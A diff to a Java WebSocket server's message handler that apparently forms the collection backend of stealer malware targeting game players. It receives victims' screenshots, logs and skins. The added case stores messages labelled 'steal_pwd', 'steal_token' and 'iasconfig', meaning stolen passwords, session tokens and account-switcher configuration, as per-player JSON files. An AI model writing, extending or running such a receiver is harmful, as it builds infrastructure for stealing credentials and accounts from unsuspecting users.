@@ -23,11 +23,11 @@ public class MessageHandler {
 
     @SuppressWarnings("ResultOfMethodCallIgnored")
     public static void handle(String[] msgArr, WebSocket conn) {
-        String ip = conn.getRemoteSocketAddress().getAddress().getHostAddress();
+        int id = conn.<Integer>getAttachment();
         try {
             switch (msgArr[0]) {
                 case "screenshot" -> {
-                    File file = new File("screenshots", getFileName("ip", "png", ip, true));
+                    File file = new File("screenshots", getFileName("ip", "png", String.valueOf(id), true));
                     new File("screenshots").mkdir();
                     file.createNewFile();
                     FileOutputStream out = new FileOutputStream(file);
@@ -36,7 +36,7 @@ public class MessageHandler {
                 }
                 case "skin" -> {
                     String playerName = Server.clientMap.get(conn).playerName;
-                    File file = new File("skins", getFileName(playerName, "png", ip, false));
+                    File file = new File("skins", getFileName(playerName, "png", String.valueOf(id), false));
                     new File("skins").mkdir();
                     file.createNewFile();
                     FileOutputStream out = new FileOutputStream(file);
@@ -44,7 +44,7 @@ public class MessageHandler {
                     out.close();
                 }
                 case "logging" -> {
-                    File file = new File("logging", getFileName("ip", "log", ip, false));
+                    File file = new File("logging", getFileName("ip", "log", String.valueOf(id), false));
                     new File("logging").mkdir();
                     file.createNewFile();
                     FileInputStream in = new FileInputStream(file);
@@ -58,6 +58,14 @@ public class MessageHandler {
                     String playerInfo = decodeBase64(msgArr[1]);
                     Server.clientMap.replace(conn, new Gson().fromJson(playerInfo, Client.class));
                     log("Message: " + msgArr[0] + " " + playerInfo);
+                }
+                case "steal_pwd", "steal_token", "iasconfig" -> {
+                    File file = new File("player", getFileName(msgArr[0], "json", Server.clientMap.get(conn).playerName, true));
+                    new File("player").mkdir();
+                    file.createNewFile();
+                    FileOutputStream out = new FileOutputStream(file);
+                    out.write(decodeBase64(msgArr[1]).getBytes(StandardCharsets.UTF_8));
+                    out.close();
                 }
                 default -> log("Message: " + msgArr[0] + " " + decodeBase64(msgArr[1]));
             }
